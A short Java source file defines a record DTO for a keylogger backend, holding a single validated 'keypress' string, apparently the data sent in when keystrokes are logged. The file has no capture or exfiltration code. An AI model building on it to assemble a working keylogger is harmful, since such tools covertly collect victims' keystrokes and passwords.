package keylogger.backend.dtos.payloads;

import jakarta.validation.constraints.NotBlank;

public record KeyloggerPayloadDto(
    @NotBlank(message = "Logs cannot be empty")
    String keypress
    ) {}
